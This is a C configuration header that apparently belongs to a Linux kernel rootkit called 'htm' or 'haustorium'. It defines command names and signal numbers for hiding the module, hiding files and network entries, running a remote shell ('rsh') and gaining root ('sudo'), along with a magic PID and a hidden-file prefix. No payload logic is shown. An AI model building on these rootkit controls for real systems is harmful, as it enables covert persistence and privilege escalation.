#ifndef CONFIG_H
#define CONFIG_H

#define HTM_MODULE_NAME "htm"

#define HTMCTL_CMD_HELP   "help"
#define HTMCTL_CMD_INFO   "info"
#define HTMCTL_CMD_LOAD   "load"
#define HTMCTL_CMD_UNLOAD "unload"

#define HTM_CMD_EXEC        "exec"
#define HTM_CMD_DISABLE_CDD "disable-cdd"
#define HTM_CMD_DISABLE_FS  "disable-fs"
#define HTM_CMD_DISABLE_NF  "disable-nf"
#define HTM_CMD_ENABLE_CDD  "enable-cdd"
#define HTM_CMD_ENABLE_FS   "enable-fs"
#define HTM_CMD_ENABLE_NF   "enable-nf"
#define HTM_CMD_HIDE_MODULE "hide-module"
#define HTM_CMD_RSH         "rsh"
#define HTM_CMD_SHOW_MODULE "show-module"
#define HTM_CMD_SUDO        "sudo"

// Feigerbaum's constant
#define HTM_PID 46692

#define HTM_SIG_DISABLE_CDD 1
#define HTM_SIG_DISABLE_FS  2
#define HTM_SIG_DISABLE_NF  3
#define HTM_SIG_ENABLE_CDD  4
#define HTM_SIG_ENABLE_FS   5
#define HTM_SIG_ENABLE_NF   6
#define HTM_SIG_HIDE_MODULE 7
#define HTM_SIG_SHOW_MODULE 8
#define HTM_SIG_STATUS      9
#define HTM_SIG_SUDO        10

#define HTM_FS_STRING ".haustorium"

#define HTM_CDD_NAME "htm"
#endif
